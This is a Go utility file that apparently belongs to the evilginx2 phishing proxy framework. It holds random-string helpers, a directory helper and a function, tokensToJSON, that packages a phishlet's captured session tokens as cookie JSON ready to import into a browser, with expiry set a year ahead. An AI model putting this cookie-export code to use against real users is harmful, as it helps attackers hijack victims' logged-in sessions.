package core

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

func GenRandomToken() string {
	rdata := make([]byte, 64)
	rand.Read(rdata)
	hash := sha256.Sum256(rdata)
	token := fmt.Sprintf("%x", hash)
	return token
}

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func CreateDir(path string, perm os.FileMode) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = os.Mkdir(path, perm)
		if err != nil {
			return err
		}
	}
	return nil
}

func tokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}